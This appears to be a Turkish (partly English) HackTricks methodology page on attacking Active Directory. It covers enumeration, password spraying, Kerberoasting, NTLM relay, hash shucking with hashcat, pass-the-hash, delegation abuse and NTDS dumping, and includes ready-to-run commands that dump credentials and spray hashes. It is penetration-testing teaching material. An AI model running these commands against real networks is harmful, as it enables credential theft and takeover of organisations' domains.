# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, ağ yöneticilerinin bir ağ içinde **domain**, **users** ve **objects** oluşturup yönetmesini verimli hâle getiren temel bir teknolojidir. Ölçeklenebilir şekilde tasarlanmış olup çok sayıda kullanıcının yönetilebilir **gruplar** ve **subgroups** halinde organize edilmesine ve farklı seviyelerde **erişim hakları** kontrolüne izin verir.

**Active Directory** yapısı üç ana katmandan oluşur: **domains**, **trees** ve **forests**. Bir **domain**, ortak bir veritabanını paylaşan **users** veya **devices** gibi nesneler koleksiyonunu kapsar. **Trees**, ortak bir yapıyı paylaşan bu domainlerin gruplarıdır ve bir **forest**, birden fazla tree'nin **trust relationships** ile birbirine bağlandığı yapıyı temsil ederek organizasyonel yapının en üst katmanını oluşturur. Her bir seviyede belirli **erişim** ve **iletişim hakları** atanabilir.

**Active Directory** içindeki anahtar kavramlar şunlardır:

1. **Directory** – Active Directory nesnelerine ait tüm bilgileri barındırır.
2. **Object** – Directory içindeki varlıkları ifade eder; bunlara **users**, **groups** veya **shared folders** dahildir.
3. **Domain** – Directory nesneleri için bir kapsayıcıdır; bir **forest** içinde birden fazla domain bulunabilir ve her biri kendi nesne koleksiyonunu tutar.
4. **Tree** – Ortak bir root domain'i paylaşan domainlerin gruplanmasıdır.
5. **Forest** – Active Directory'deki organizasyon yapısının en üst noktasıdır; birbirleriyle **trust relationships** içinde olan birden fazla tree'den oluşur.

**Active Directory Domain Services (AD DS)**, merkezi yönetim ve ağ içi iletişim için kritik olan bir dizi servisi kapsar. Bu servisler şunlardır:

1. **Domain Services** – Veri depolamayı merkezileştirir ve **users** ile **domains** arasındaki etkileşimleri yönetir; buna **authentication** ve **search** fonksiyonları dahildir.
2. **Certificate Services** – Güvenli **digital certificates** oluşturma, dağıtma ve yönetimini sağlar.
3. **Lightweight Directory Services** – LDAP protokolü üzerinden directory-özellikli uygulamaları destekler.
4. **Directory Federation Services** – Birden fazla web uygulamasında tek oturumla kimlik doğrulama sağlayan **single-sign-on** yetenekleri sunar.
5. **Rights Management** – Telif hakkı materyallerinin yetkisiz dağıtımını ve kullanılmasını kontrol ederek korumaya yardımcı olur.
6. **DNS Service** – **domain names** çözümlemesi için kritik öneme sahiptir.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir AD'ye nasıl saldırılacağını öğrenmek istiyorsanız Kerberos authentication sürecini gerçekten iyi anlamanız gerekir.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Hızlı Referans

Hangi komutları çalıştırarak bir AD'yi enumerate/exploit edebileceğinize hızlıca göz atmak için [https://wadcoms.github.io/](https://wadcoms.github.io) adresinden faydalanabilirsiniz.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (Kimlik bilgisi/oturum yok)

Bir AD ortamına erişiminiz varsa ancak herhangi bir kimlik bilgisi/oturumunuz yoksa şu adımları izleyebilirsiniz:

- **Pentest the network:**
- Ağı tarayın, makineleri ve açık portları bulun ve bu makineler üzerinde **vulnerabilities** exploit etmeyi ya da kimlik bilgilerini extract etmeyi deneyin (örneğin, [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS'yi enumerate etmek, domain içindeki web, printers, shares, vpn, media gibi anahtar sunucular hakkında bilgi verebilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Daha fazlası için General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına bakın.
- **Check for null and Guest access on smb services** (bu modern Windows sürümlerinde çalışmayabilir):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB sunucusunu enumerate etme hakkında daha detaylı bir kılavuz burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'ı enumerate etme hakkında daha detaylı bir kılavuz burada bulunabilir (özellikle **anonymous access**'e dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder ile servisleri impersonate ederek kimlik bilgileri toplayın (bkz. ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ile host'a erişim sağlayın
- evil-S ile sahte UPnP servisleri **exposing** yaparak kimlik bilgileri toplayın (bkz. ../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- İç belgelerden, sosyal medyadan, domain içindeki servislerden (özellikle web) ve genel olarak halka açık kaynaklardan kullanıcı adlarını/isimleri çıkarın.
- Şirket çalışanlarının tam isimlerini bulursanız, farklı AD **username conventions** deneyebilirsiniz ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın konvansiyonlar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Araçlar:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Kullanıcı enumerasyonu

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: Geçersiz bir username sorgulandığında sunucu **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıtlayarak username'in geçersiz olduğunu belirlememizi sağlar. **Valid usernames** ya bir **TGT in a AS-REP** yanıtıyla ya da kullanıcının pre-authentication yapmasının gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasıyla karşılık verir.
- **No Authentication against MS-NRPC**: Domain controller'lar üzerinde MS-NRPC (Netlogon) arayüzüne auth-level = 1 (No authentication) ile bağlanarak kimlik doğrulama olmadan sorgu yapma. Yöntem, MS-NRPC arayüzüne bind edildikten sonra `DsrGetDcNameEx2` fonksiyonunu çağırarak kullanıcı veya bilgisayarın var olup olmadığını herhangi bir credential olmadan kontrol eder. Bu tür enumeration'ı uygulayan araç [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)'dir. Araştırma şu adreste bulunabilir: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, **user enumeration against it** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adı listelerini [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  ve ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) adreslerinde bulabilirsiniz.
>
> Ancak, daha önce yapmış olmanız gereken recon adımından şirkette çalışan kişilerin isimlerini edinmiş olmalısınız. İsim ve soyisim ile [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanarak potansiyel geçerli kullanıcı adları üretebilirsiniz.

### Bir veya birkaç kullanıcı adını bilmek

Tamam, geçerli bir kullanıcı adınız olduğunu ama şifrenizin olmadığını biliyorsunuz... O zaman deneyin:

- [**ASREPRoast**](asreproast.md): Eğer bir kullanıcının _DONT_REQ_PREAUTH_ özniteliği yoksa, o kullanıcı için bir AS_REP mesajı isteyebilirsiniz; bu mesaj, kullanıcının parolasından türetilen bir anahtarla şifrelenmiş bazı veriler içerir.
- [**Password Spraying**](password-spraying.md): Keşfedilen her kullanıcı için en yaygın şifreleri deneyin; belki bir kullanıcı zayıf bir şifre kullanıyordur (parola politikasını unutmayın!).
- Ayrıca kullanıcıların mail sunucularına erişim sağlamaya çalışmak için **spray OWA servers** da deneyebilirsiniz.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Bazı protokollerde poisoning yaparak kırılabilecek challenge hash'leri elde edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory'yi enumerate etmeyi başardıysanız daha fazla e-posta adresi ve ağ hakkında daha iyi bir anlayışa sahip olursunuz. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlayarak AD ortamına erişim elde edebilirsiniz.

### Steal NTLM Creds

Eğer **null veya guest user** ile diğer PC'lere veya paylaşımlara erişebiliyorsanız, bir şekilde erişildiğinde sizin aleyhinize NTLM kimlik doğrulamasını tetikleyecek (ör. bir SCF dosyası gibi) dosyalar yerleştirebilirsiniz; böylece kırmak için **NTLM challenge**'ı **steal** edebilirsiniz:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, elinizdeki her NT hash'ini, anahtar malzemesi doğrudan NT hash'inden türetilen daha yavaş formatlar için aday parola olarak değerlendirir. Kerberos RC4 ticket'larındaki uzun parolaları, NetNTLM challenge'larını veya cached credentials'ı brute-force etmek yerine, NT hash'lerini Hashcat’in NT-candidate modlarına verirsiniz ve Hashcat, düz metni hiç öğrenmeden parola yeniden kullanımını doğrular. Bu, bir domain ihlali sonrası binlerce mevcut ve geçmiş NT hash'i topladığınızda özellikle etkilidir.

Hash shucking'i kullanın:

- DCSync/NTDS, SAM/SECURITY dökümleri veya credential vault'lardan bir NT korpusu elde ettiyseniz ve bunların diğer, daha yavaş formatlarda yeniden kullanımını test etmeniz gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM cevapları veya DCC/DCC2 blob'ları yakaladığınızda.
- Uzun, kırılması zor parolalar için hızlıca yeniden kullanım kanıtı sunmak ve hemen Pass-the-Hash ile pivot yapmak istediğinizde.

Tekniğin işe yaramadığı durumlar da vardır: anahtarların NT hash'i olmadığı şifreleme türlerine (ör. Kerberos etype 17/18 AES) karşı çalışmaz. Eğer bir domain sadece AES'i zorunlu kılıyorsa, normal parola modlarına geri dönmelisiniz.

#### Bir NT hash korpusu oluşturma

- **DCSync/NTDS** – Mümkün olan en geniş NT hash setini (ve önceki değerlerini) almak için history ile `secretsdump.py` kullanın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History girdileri, Microsoft'un hesap başına maksimum 24 önceki hash saklayabilmesi nedeniyle aday havuzunu önemli ölçüde genişletir. NTDS secret'larını hasat etmenin diğer yolları için bakınız:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`) yerel SAM/SECURITY verilerini ve cached domain logon'ları (DCC/DCC2) çıkarır. Bu hash'leri ayıklayıp aynı `nt_candidates.txt` listesine ekleyin.
- **Metadataları takip edin** – Her hash'i üreten username/domain bilgisini koruyun (sözlük yalnızca hex içerse bile). Eşleşen hash'ler Hashcat kazanan adayını yazdırır yazdırmaz hangi principal'ın parola yeniden kullandığını size hemen söyler.
- Shucking yaparken aynı forest veya güvenilen bir forest'tan adayları tercih edin; bu, çakışma şansını maksimize eder.

#### Hashcat NT-candidate modları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girdileri **ham 32-hex NT hashleri** olarak kalmalıdır. Kural motorlarını devre dışı bırakın (no `-r`, hybrid modlar yok) çünkü mangling aday anahtar malzemesini bozar.
- Bu modlar doğası gereği daha hızlı değildir, ancak NTLM anahtar uzayı (~30,000 MH/s bir M3 Max'te) Kerberos RC4'e (~300 MH/s) göre yaklaşık 100× daha hızlıdır. Küratörlü bir NT listesi test etmek, yavaş formatta tüm parola alanını keşfetmekten çok daha ucuzdur.
- Her zaman **en güncel Hashcat build'ini** kullanın (`git clone https://github.com/hashcat/hashcat && make install`) çünkü 31500/31600/35300/35400 modları yeni eklendi.
- Şu anda AS-REQ Pre-Auth için bir NT modu yoktur ve AES etype'lar (19600/19700) için düz metin parola gereklidir çünkü anahtarları PBKDF2 ile UTF-16LE parolalardan türetilir, ham NT hash'lerinden değil.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük ayrıcalıklı bir kullanıcı ile hedef SPN için bir RC4 TGS yakalayın (detaylar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Bilet'i NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat, her NT adayından RC4 anahtarını türetir ve `$krb5tgs$23$...` blob'unu doğrular. Bir eşleşme, servis hesabının elinizdeki NT hash'lerinden birini kullandığını onaylar.

3. Hemen PtH ile pivot yapın:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse daha sonra düz metni `hashcat -m 1000 <matched_hash> wordlists/` ile kurtarabilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Kompromize edilmiş bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlginç domain kullanıcısına ait DCC2 satırını `dcc2_highpriv.txt` içine kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, zaten listenizde bulunan NT hash'ini verir ve cached kullanıcının parolasını yeniden kullandığını kanıtlar. Bunu doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya hızlı NTLM modunda brute-force edip düz metni kurtarın.

Aynı iş akışı NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH veya NT hash'ini offline olarak mask/rule ile tekrar kırma yollarına başvurabilirsiniz.



## Enumerating Active Directory WITH credentials/session

Bu aşama için geçerli bir domain hesabının kimlik bilgilerini veya oturumunu **kompromize etmiş** olmanız gerekir. Eğer bazı geçerli kimlik bilgilerine veya domain kullanıcısı olarak bir shell'e sahipseniz, **önceden verilen seçeneklerin diğer kullanıcıları kompromize etmek için hâlâ seçenekler olduğunu** unutmayın.

Authenticated enumeration'a başlamadan önce **Kerberos double hop problem**'i bilmelisiniz.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir hesabı kompromize etmek, tüm domain'i kompromize etmeye başlamak için **büyük bir adımdır**, çünkü Active Directory Enumeration'a başlayabileceksiniz:

- [**ASREPRoast**](asreproast.md) ile şimdi her olası zayıf kullanıcıyı bulabilirsiniz, ve [**Password Spraying**](password-spraying.md) ile kompromize olmuş hesabın şifresini, boş şifreleri veya yeni umut verici şifreleri tüm kullanıcılar üzerinde deneyebilirsiniz.
- Basit bir recon için [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) kullanabilirsiniz.
- Daha stealthy olması için [**powershell for recon**](../basic-powershell-for-pentesters/index.html) kullanabilirsiniz.
- Daha detaylı bilgi almak için [**use powerview**](../basic-powershell-for-pentesters/powerview.md) kullanabilirsiniz.
- Active Directory'de recon için harika bir diğer araç [**BloodHound**](bloodhound.md). Kullanılan collection yöntemlerine bağlı olarak **çok stealthy değildir**, ama eğer bu umrunuzda değilse mutlaka deneyin. Kullanıcıların nerelere RDP yapabildiğini, diğer gruplara giden yolları bulun, vb.
- **Diğer otomatik AD enumeration araçları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- AD'nin [**DNS kayıtları**](ad-dns-records.md) ilginç bilgiler içerebilir.
- Directory'yi enumerate etmek için GUI tabanlı bir araç olarak **AdExplorer.exe** (SysInternal Suite) kullanılabilir.
- LDAP veritabanında `ldapsearch` ile _userPassword_ & _unixUserPassword_ alanlarında veya _Description_ alanında credential arayabilirsiniz. Diğer yöntemler için bkz. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- **Linux** kullanıyorsanız domain'i enumerate etmek için [**pywerview**](https://github.com/the-useless-one/pywerview) da kullanabilirsiniz.
- Otomatik araçlara örnekler:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarmak**

Windows'ta tüm domain kullanıcı adlarını almak çok kolaydır (`net user /domain`, `Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta ise `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>` kullanabilirsiniz.

> Bu Enumeration bölümü küçük görünse bile en önemli kısımdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound olanlara) girin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve rahat hissedene kadar pratik yapın. Bir assessment sırasında burası, DA'ya ulaşmak veya daha fazla iş yapılamayacağına karar vermek için kilit an olacaktır.

### Kerberoast

Kerberoasting, kullanıcı hesaplarına bağlı servislerin kullandığı **TGS ticket'larını** elde etmeyi ve bunların şifrelemesini (kullanıcı parolalarına dayanır) **offline** kırmayı içerir.

Detaylar için:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Bazı kimlik bilgilerini elde ettikten sonra herhangi bir **makineye** erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port taramalarınıza göre çeşitli protokollerle birçok sunucuya bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Eğer bir regular domain kullanıcısı olarak kimlik bilgilerini veya bir oturumu kompromize ettiyseniz ve bu kullanıcı ile domain içindeki herhangi bir makineye **erişiminiz** varsa, yerel olarak **privilege escalation** yollarını aramalı ve credential aramalısınız. Çünkü yalnızca local administrator ayrıcalıklarıyla diğer kullanıcıların hash'lerini memory'den (LSASS) ve yerel olarak (SAM) dump edebilirsiniz.

Bu kitapta [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) hakkında tam bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Current Session Tickets

Mevcut kullanıcının sahip olduğu biletlerin beklenmedik kaynaklara erişim izni veriyor olma ihtimali çok **düşüktür**, fakat yine de kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **daha fazla e-posta ve ağ hakkında daha iyi bir anlayış**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Sonra, bellekten ve yereldeki tüm hash'leri dump etme zamanı.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **taklit etmek**.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS** bunun **hafiflemesine** yardımcı olacağını unutmayın.

### MSSQL Abuse & Trusted Links

Eğer bir kullanıcı **MSSQL instance'larına erişim** ayrıcalığına sahipse, MSSQL hostunda (SA olarak çalışıyorsa) **komut çalıştırmak**, NetNTLM **hash**'ini **çalmak** veya hatta bir **relay** **saldırısı** gerçekleştirmek için bunu kullanabilir.\
Ayrıca, eğer bir MSSQL instance başka bir MSSQL instance tarafından trusted (database link) olarak belirlenmişse ve kullanıcı trusted veritabanı üzerinde ayrıcalıklara sahipse, **güven ilişkisini kullanarak diğer instance'ta da sorgular çalıştırabilir**. Bu trustlar zincirlenebilir ve bir noktada kullanıcı komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.\
**Veritabanları arasındaki linkler forest trust'ları boyunca bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Üçüncü taraf envanter ve deployment çözümleri genellikle kimlik bilgilerine ve kod çalıştırmaya güçlü yollar açar. Bakınız:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Eğer herhangi bir Computer objesi [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğine sahipse ve bilgisayar üzerinde domain ayrıcalıklarınız varsa, bilgisayara giriş yapan tüm kullanıcıların belleğinden TGT'leri dökme imkanınız olur.\
Dolayısıyla, eğer bir **Domain Admin bu bilgisayara giriş yaparsa**, onun TGT'sini dökebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onun kimliğine bürünebilirsiniz.\
Constrained delegation sayesinde hatta **bir Print Server'ı otomatik olarak ele geçirebilirsiniz** (umarız bir DC olmaz).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Eğer bir kullanıcı veya bilgisayar "Constrained Delegation" için izinliyse, **bir bilgisayardaki bazı servislere erişmek için herhangi bir kullanıcının yerine geçebilir**.\
Sonra, eğer bu kullanıcı/bilgisayarın **hash'ini ele geçirirseniz**, bazı servislere erişmek için **herhangi bir kullanıcıyı** (hatta domain adminleri) **taklit edebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir bilgisayarın Active Directory objesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** kod çalıştırma elde etmeyi sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ele geçirilen kullanıcı bazı **ilginç ayrıcalıklara bazı domain objeleri üzerinde** sahip olabilir; bu da size daha sonra **lateral hareket** etme veya **yetki yükseltme** imkanı verebilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool servisi dinleyen** bir sistem tespit edilirse, bu **istismar edilerek** **yeni kimlik bilgileri edinilebilir** ve **ayrıcalıklar yükseltilebilir**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Eğer **diğer kullanıcılar** **ele geçirilmiş** makineye **erişiyorsa**, bellekten **kimlik bilgileri toplamak** ve hatta **onların proseslerine beacon enjekte ederek** onları taklit etmek mümkün olabilir.\
Genelde kullanıcılar sisteme RDP ile erişir, bu yüzden üçüncü taraf RDP oturumlarına karşı birkaç saldırı nasıl yapılır burada mevcut:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e bağlı bilgisayarlarda **local Administrator parolasını** yönetmek için bir sistem sağlar; parolaların **rastgele**, benzersiz ve sıkça **değiştirilmesini** sağlar. Bu parolalar Active Directory'de saklanır ve erişim yalnızca yetkili kullanıcılara ACL'lerle kontrol edilir. Bu parolalara erişim için yeterli izne sahip olmak, diğer bilgisayarlara pivot yapmayı mümkün kılar.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Ele geçirilmiş makinadan **sertifikaları toplamak**, ortam içinde ayrıcalık yükseltme yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Eğer **zayıf/vulnerable template'ler** yapılandırılmışsa, bunlar istismar edilerek ayrıcalık yükseltme mümkün olabilir:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Bir kere **Domain Admin** veya daha da iyi **Enterprise Admin** ayrıcalıkları elde ettiğinizde, **domain veritabanını**: _ntds.dit_ **dökebilirsiniz**.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

